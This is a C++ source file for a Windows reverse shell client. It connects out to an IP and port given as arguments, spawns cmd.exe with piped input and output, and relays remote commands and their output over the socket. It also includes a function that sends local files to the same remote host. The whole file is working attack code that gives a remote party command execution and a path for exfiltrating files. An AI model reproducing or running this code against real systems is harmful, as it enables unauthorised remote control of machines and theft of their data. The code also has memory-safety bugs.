
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <winsock2.h>
#include <BaseTsd.h>
#include <Windows.h>
#include <string>
typedef SSIZE_T ssize_t;

char * server_ip;
int server_port;
static const int BUFFER_SIZE = 16 * 1024;

using std::string;

HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;
HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;

#define BUFSIZE 4096

void WriteToPipe(string msg);
char* ReadFromPipe(void);

int main(int argc, char ** argv){
	if (argc < 2) {
		printf("Usage: winshell_client [ip] [port]");
		exit(10);
	}
	server_ip = argv[1];
	server_port = atoi(argv[2]);
	// Initialize Winsock.
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR)
		printf("Client: Error at WSAStartup().\n");
	else
		printf("Client: WSAStartup() is OK.\n");
	// Create a socket.
	SOCKET m_socket;
	m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (m_socket == INVALID_SOCKET)
	{
		printf("Client: socket() - Error at socket(): %ld\n", WSAGetLastError());
		WSACleanup();
		return 0;
	}
	else
		printf("Client: socket() is OK.\n");
	// Connect to a server.
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	// Just test using the localhost, you can try other IP address
	clientService.sin_addr.s_addr = inet_addr(server_ip);
	clientService.sin_port = htons(server_port);
	if (connect(m_socket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR){
		printf("Client: connect() - Failed to connect.\n");
		WSACleanup();
		return 0;
	}
	else{
		printf("Client: connect() is OK.\n");
		printf("Client: Can start sending and receiving data...\n");
	}

	//BEFORE sending/recieving, open a command line session and redirect its I/O to our pipes
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	// Create pipes for the child process's STDOUT and STDIN,
	// ensures both handle are not inherited
	CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
	SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);

	CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0);
	SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

	
	// CREATE CHILD PROCESS

	TCHAR szCmdline[] = TEXT("cmd.exe");
	STARTUPINFO siStartInfo;
	PROCESS_INFORMATION piProcInfo;

	// Set up members of the PROCESS_INFORMATION structure.
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure.
	// This structure specifies the STDIN and STDOUT handles for redirection.
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	CreateProcess(NULL, szCmdline, NULL, NULL, TRUE, 0,
		NULL, NULL, &siStartInfo, &piProcInfo);

	// Close handles to the child process and its primary thread.
	// Some applications might keep these handles to monitor the status
	// of the child process, for example. 
	CloseHandle(g_hChildStd_OUT_Wr);
	CloseHandle(g_hChildStd_IN_Rd);
	CloseHandle(piProcInfo.hProcess);
	CloseHandle(piProcInfo.hThread);
	
	//Done opening command line session

	// Send and receive data.
	int bytesSent;
	int bytesRecv = SOCKET_ERROR;
	// Be careful with the array bound, provide some checking mechanism...
	char sendbuf[16000] = "";
	char recvbuf[16000] = "";
	char inFromPipe[16000] = "";
	int inLen = 0;
	int prevLen = 0;
	// Receives some test string to server...
	while (true)
	{
		printf("Executing main loop");
		ReadFromPipe();
		strcpy(sendbuf, ReadFromPipe());
		bytesSent = send(m_socket, sendbuf, strlen(sendbuf), 0);

		bytesRecv = recv(m_socket, recvbuf, 16000, 0);
		if (bytesRecv == 0 || bytesRecv == WSAECONNRESET)
		{
			break;
		}
		if (bytesRecv < 0)
			return 0;
		else {
			WriteToPipe(recvbuf);
		}
		
	}
	WSACleanup();
	return 0;
}

void WriteToPipe(string msg)
{
	WriteFile(g_hChildStd_IN_Wr, msg.c_str(), msg.size(), NULL, NULL);
}

char* ReadFromPipe(void)
{
	DWORD total = 0;
	DWORD dwRead, dwWritten;
	CHAR chBuf[BUFSIZE];
	BOOL bSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	CHAR oldChBuf[BUFSIZE] = "";
	for (;;)
	{
		//bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
		//if (!bSuccess || dwRead == 0) break;
		PeekNamedPipe(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL, NULL);
		total += dwRead;
		if (strcmp(chBuf, oldChBuf) == 0) break;
		Sleep(250);
		strcpy(oldChBuf, chBuf);
		//bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
		//if (!bSuccess) break;
	}
	chBuf[total] = 0;
	return chBuf;
}

static void SendFile(const char * fileName)
{
	FILE * fpIn = fopen(fileName, "r");
	if (fpIn)
	{
		int s = socket(AF_INET, SOCK_STREAM, 0);
		if (s >= 0)
		{
			struct sockaddr_in saAddr; memset(&saAddr, 0, sizeof(saAddr));
			saAddr.sin_family = AF_INET;
			saAddr.sin_addr.s_addr = htonl(inet_addr(server_ip));
			saAddr.sin_port = htons(server_port);

			if (connect(s, (struct sockaddr *) &saAddr, sizeof(saAddr)) == 0)
			{
				printf("Connected to remote host, sending file [%s]\n", fileName);

				char buf[BUFFER_SIZE];
				while (1)
				{
					ssize_t bytesRead = fread(buf, 1, sizeof(buf), fpIn);
					if (bytesRead <= 0) break;  // EOF

					printf("Read %i bytes from file, sending them to network...\n", (int)bytesRead);
					if (send(s, buf, bytesRead, 0) != bytesRead)
					{
						perror("send");
						break;
					}
				}
			}
			else perror("connect");
			closesocket(s);
		}
		else perror("socket");

		fclose(fpIn);
	}
	else printf("Error, couldn't open file [%s] to send!\n", fileName);
}